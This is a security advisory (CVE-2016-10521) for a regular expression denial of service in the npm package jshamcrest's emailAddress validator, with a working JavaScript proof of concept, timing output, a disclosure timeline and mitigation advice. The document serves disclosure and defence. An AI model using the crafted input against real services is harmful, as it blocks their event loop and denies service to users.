# [H] Regular Expression Denial of Service in jshamcrest

## Summary
Severity: High
Advisory: GHSA-xj62-87pg-vcv3
CVE: CVE-2016-10521
CWE: CWE-400
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2019-02-18
Source: https://github.com/advisories/GHSA-xj62-87pg-vcv3
Type: github-advisory

## Affected
- npm: `jshamcrest` — affected >=0

## Details
The `jshamcrest` package is affected by a regular expression denial of service vulnerability when certain types of user input are passed in to the emailAddress validator.


## Proof of concept

```js
var js = require('jshamcrest')
var emailAddress = new js.JsHamcrest.Matchers.emailAddress();


var genstr = function (len, chr) {
    var result = "";
    for (i=0; i<=len; i++) {
        result = result + chr;
    }

    return result;
}


for (i=1;i<=10000000;i=i+1) {
    console.log("COUNT: " + i);
    var str = '66666666666666666666666666666@ffffffffffffffffffffffffffffffff.' + genstr(i, 'a') + '{'
    console.log("LENGTH: " + str.length);
    var start = process.hrtime();
    emailAddress.matches(str)

    var end = process.hrtime(start);
    console.log(end);
}
```

### Results
It takes about 116 characters to get a 1.6 second event loop block.
```
[ 1, 633084590 ]
COUNT: 51
LENGTH: 116
```

# Timeline
- October 25, 2015 - Vulnerability Identified
- October 25, 2015 - Maintainers notified (no response)


## Recommendation

The `jshamcrest` package currently has no patched versions available.

At this time, the best available mitigation is to use an alternative module that is actively maintained and provides similar functionality. There are [multiple modules fitting this criteria available on npm.](https://www.npmjs.com/search?q=validator).

## References
- https://nvd.nist.gov/vuln/detail/CVE-2016-10521
- https://github.com/advisories/GHSA-xj62-87pg-vcv3
- https://www.npmjs.com/advisories/53
